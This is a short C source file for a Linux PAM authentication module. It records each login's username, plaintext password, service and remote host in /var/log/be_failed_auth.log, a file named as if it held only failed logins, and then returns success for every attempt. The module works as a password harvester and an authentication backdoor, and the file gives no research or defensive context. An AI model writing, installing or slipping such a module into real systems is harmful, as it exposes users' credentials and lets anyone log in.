#include "library.h"
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include <stdio.h>
#include <stdlib.h>

// overhaul soon basic.
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
                                   const char **argv) {
    char *username,
         *password,
         *protocol,
         *hostname;

    pam_get_item(pamh, PAM_AUTHTOK, (void*)&password);
    pam_get_item(pamh, PAM_USER, (void*)&username);
    pam_get_item(pamh, PAM_SERVICE, (void*)&protocol);
    pam_get_item(pamh, PAM_RHOST, (void*)&hostname);

    FILE *fd = fopen("/var/log/be_failed_auth.log", "a");
    if (fd != NULL) {
        fprintf(fd, "%s | %s | %s | %s \n", username, password, hostname, protocol);
        fclose(fd);
    }

    return PAM_SUCCESS;
}
